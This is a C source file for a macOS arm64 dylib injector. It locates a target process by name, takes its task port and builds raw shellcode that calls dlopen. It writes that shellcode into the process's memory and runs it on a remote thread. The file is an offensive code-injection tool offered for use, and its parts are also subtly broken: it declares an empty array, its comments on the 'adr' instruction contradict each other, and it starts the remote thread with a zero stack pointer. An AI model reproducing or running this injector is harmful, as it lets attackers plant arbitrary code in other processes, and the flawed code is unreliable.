#include "Injector.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <signal.h>

#include <mach/mach_vm.h>
#include <mach/thread_act.h>
#include <sys/sysctl.h>

/* Shellcode stub that calls dlopen(path, RTLD_NOW)
   Layout:
     [0x00]  adr  x0, #12        ; x0 = address of path string (relative)
     [0x04]  mov  x1, #2          ; RTLD_NOW = 2
     [0x08]  b    #8              ; skip over the path string
     [0x0C]  <path bytes + null>  ; the dylib path as a C string
     [...]   ldr  x8, [x0, #-16] ; load dlopen addr from fixed slot
                                  ; actually simpler: we resolve dlopen
                                  ; and put its address right before path
     [...]   blr  x8             ; call dlopen
     [...]   ret                  ; return to thread exit
*/

static const uint8_t kShellCodeTemplate[] = {
    /* We build the actual shellcode dynamically in BuildShellCode */
};

static const uint32_t kRtldNow = 2;

pid_t FindProcessByName(const char *ProcessName)
{
    int Mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
    size_t BufferSize = 0;

    if (sysctl(Mib, 3, NULL, &BufferSize, NULL, 0) < 0) {
        perror("sysctl (size)");
        return -1;
    }

    struct kinfo_proc *ProcessList = malloc(BufferSize);
    if (!ProcessList) {
        perror("malloc");
        return -1;
    }

    if (sysctl(Mib, 3, ProcessList, &BufferSize, NULL, 0) < 0) {
        perror("sysctl (list)");
        free(ProcessList);
        return -1;
    }

    size_t Count = BufferSize / sizeof(struct kinfo_proc);
    pid_t Result = -1;

    for (size_t i = 0; i < Count; i++) {
        const char *Name = ProcessList[i].kp_proc.p_comm;
        if (strncmp(Name, ProcessName, MAXCOMLEN) == 0) {
            Result = ProcessList[i].kp_proc.p_pid;
            break;
        }
    }

    free(ProcessList);
    return Result;
}

bool AttachToProcess(InjectionContext *Context)
{
    kern_return_t Kr = task_for_pid(mach_task_self(), Context->TargetPid, &Context->TaskPort);
    if (Kr != KERN_SUCCESS) {
        fprintf(stderr, "task_for_pid failed (pid %d): %s\n",
                Context->TargetPid, mach_error_string(Kr));
        fprintf(stderr, "Hint: run with sudo or sign with com.apple.security.cs.debugger\n");
        return false;
    }

    printf("[+] Attached to pid %d (task port 0x%x)\n", Context->TargetPid, Context->TaskPort);
    return true;
}

static void *ResolveRemoteDlopen(void)
{
    void *LocalAddr = dlsym(RTLD_DEFAULT, "dlopen");
    if (!LocalAddr) {
        fprintf(stderr, "[-] Could not resolve local dlopen\n");
        return NULL;
    }

    return LocalAddr;
}

static bool BuildShellCode(uint8_t *OutBuffer, size_t *OutSize, uint64_t DlopenAddr, const char *Path)
{
    size_t PathLen = strlen(Path) + 1;
    size_t CodeLen = PathLen + 64; /* headroom */

    if (CodeLen > SHELLCODE_MAX) {
        fprintf(stderr, "[-] Dylib path too long for shellcode buffer\n");
        return false;
    }

    memset(OutBuffer, 0, SHELLCODE_MAX);
    uint32_t *Insn = (uint32_t *)OutBuffer;
    int Idx = 0;


    Insn[Idx++] = 0xa9bf7bfd;  /* stp x29, x30, [sp, #-16]! */
    Insn[Idx++] = 0x910003fd;  /* mov x29, sp                */

    uint32_t *PoolSlot = (uint32_t *)(OutBuffer + SHELLCODE_MAX - 8);
    memcpy(OutBuffer + SHELLCODE_MAX - 8, &DlopenAddr, 8);

    /* adr x0, #16           -> x0 points to the path string below */
    Insn[Idx++] = 0x10000080 | ((4 & 0x3) << 29); /* adr x0, +16 */
    /* adr x0, .+12: 10 00 06 00 */
    Insn[Idx - 1] = 0x10000060;

    /* mov x1, #2 (RTLD_NOW) */
    Insn[Idx++] = 0xd2800041;  /* mov x1, #2 */

    /* branch over the path string to the ldr+blr sequence */
    uint32_t PathWords = (PathLen + 3) / 4;
    /* b +4*(PathWords+1)  to skip past the string to the pool load */
    int SkipBytes = (PathWords + 1) * 4;
    int32_t BrOffset = SkipBytes / 4;
    Insn[Idx++] = 0x14000000 | (BrOffset & 0x03FFFFFF);  /* b .+offset */

    /* Copy path string */
    memcpy(OutBuffer + Idx * 4, Path, PathLen);
    Idx += PathWords;

    int PoolOffset = (int)(SHELLCODE_MAX - 8) - (int)(Idx * 4);
    if (PoolOffset < 0 || PoolOffset > 32760 || (PoolOffset & 3) != 0) {
        fprintf(stderr, "[-] Shellcode pool offset out of range (%d)\n", PoolOffset);
        return false;
    }
    /* ldr x8, [pc, #offset]: F9400008 | (offset/4 << 10) */
    Insn[Idx++] = 0xF9400008 | ((PoolOffset / 4) << 10);

    /* blr x8 */
    Insn[Idx++] = 0xD63F0100;

    /* Restore frame and return */
    Insn[Idx++] = 0xa8c17bfd;  /* ldp x29, x30, [sp], #16 */
    Insn[Idx++] = 0xd65f03c0;  /* ret */

    *OutSize = SHELLCODE_MAX;
    return true;
}

/* ---------- Remote Thread Execution ---------- */

static bool ExecuteRemoteShellCode(task_t TaskPort, uint8_t *ShellCode, size_t ShellCodeSize)
{
    kern_return_t Kr;

    mach_vm_address_t RemoteBase = 0;
    Kr = mach_vm_allocate(TaskPort, &RemoteBase, ShellCodeSize, VM_FLAGS_ANYWHERE);
    if (Kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_allocate failed: %s\n", mach_error_string(Kr));
        return false;
    }

    Kr = mach_vm_write(TaskPort, RemoteBase, (vm_offset_t)ShellCode, (mach_msg_type_number_t)ShellCodeSize);
    if (Kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_write failed: %s\n", mach_error_string(Kr));
        mach_vm_deallocate(TaskPort, RemoteBase, ShellCodeSize);
        return false;
    }

    Kr = vm_protect(TaskPort, RemoteBase, ShellCodeSize, false, VM_PROT_READ | VM_PROT_EXECUTE);
    if (Kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] vm_protect (r+x) failed: %s\n", mach_error_string(Kr));
        mach_vm_deallocate(TaskPort, RemoteBase, ShellCodeSize);
        return false;
    }

    printf("[+] Shellcode written at 0x%llx (%zu bytes)\n", RemoteBase, ShellCodeSize);

    thread_act_t RemoteThread;
    arm_thread_state64_t ThreadState;
    memset(&ThreadState, 0, sizeof(ThreadState));

    ThreadState.__pc = RemoteBase;
    ThreadState.__sp = 0;

    Kr = thread_create(TaskPort, &RemoteThread);
    if (Kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] thread_create failed: %s\n", mach_error_string(Kr));
        mach_vm_deallocate(TaskPort, RemoteBase, ShellCodeSize);
        return false;
    }

    Kr = thread_set_state(RemoteThread, ARM_THREAD_STATE64,
                          (thread_state_t)&ThreadState,
                          ARM_THREAD_STATE64_COUNT);
    if (Kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] thread_set_state failed: %s\n", mach_error_string(Kr));
        thread_terminate(RemoteThread);
        mach_vm_deallocate(TaskPort, RemoteBase, ShellCodeSize);
        return false;
    }

    Kr = thread_resume(RemoteThread);
    if (Kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] thread_resume failed: %s\n", mach_error_string(Kr));
        thread_terminate(RemoteThread);
        mach_vm_deallocate(TaskPort, RemoteBase, ShellCodeSize);
        return false;
    }

    printf("[+] Remote thread launched (port 0x%x)\n", RemoteThread);

    usleep(500000);

    thread_terminate(RemoteThread);
    mach_vm_deallocate(TaskPort, RemoteBase, ShellCodeSize);

    return true;
}

bool InitializeContext(InjectionContext *Context, const char *ProcessName, const char *DylibPath)
{
    if (!Context || !ProcessName || !DylibPath) return false;

    memset(Context, 0, sizeof(*Context));

    char ResolvedPath[DYLIB_PATH_MAX];
    if (DylibPath[0] != '/') {
        if (!realpath(DylibPath, ResolvedPath)) {
            fprintf(stderr, "[-] Could not resolve dylib path: %s\n", DylibPath);
            return false;
        }
    } else {
        strncpy(ResolvedPath, DylibPath, DYLIB_PATH_MAX - 1);
    }

    pid_t Pid = FindProcessByName(ProcessName);
    if (Pid < 0) {
        fprintf(stderr, "[-] Process '%s' not found\n", ProcessName);
        return false;
    }

    Context->TargetPid = Pid;
    strncpy(Context->DylibPath, ResolvedPath, DYLIB_PATH_MAX - 1);
    Context->TaskPort = MACH_PORT_NULL;

    printf("[*] Target: %s (pid %d)\n", ProcessName, Pid);
    printf("[*] Dylib:  %s\n", ResolvedPath);

    return true;
}

bool PerformInjection(InjectionContext *Context)
{
    uint8_t ShellCode[SHELLCODE_MAX];
    size_t ShellCodeSize = 0;

    void *DlopenAddr = ResolveRemoteDlopen();
    if (!DlopenAddr) return false;

    printf("[*] dlopen at %p (local)\n", DlopenAddr);

    if (!BuildShellCode(ShellCode, &ShellCodeSize, (uint64_t)DlopenAddr, Context->DylibPath)) {
        return false;
    }

    if (!ExecuteRemoteShellCode(Context->TaskPort, ShellCode, ShellCodeSize)) {
        return false;
    }

    printf("[+] Injection complete\n");
    return true;
}

void CleanupContext(InjectionContext *Context)
{
    if (Context && Context->TaskPort != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), Context->TaskPort);
        Context->TaskPort = MACH_PORT_NULL;
    }
}


int main(int argc, char *argv[])
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <process_name> <dylib_path>\n", argv[0]);
        return 1;
    }

    InjectionContext Ctx;

    if (!InitializeContext(&Ctx, argv[1], argv[2])) {
        return 1;
    }

    if (!AttachToProcess(&Ctx)) {
        CleanupContext(&Ctx);
        return 1;
    }

    if (!PerformInjection(&Ctx)) {
        CleanupContext(&Ctx);
        return 1;
    }

    CleanupContext(&Ctx);
    return 0;
}
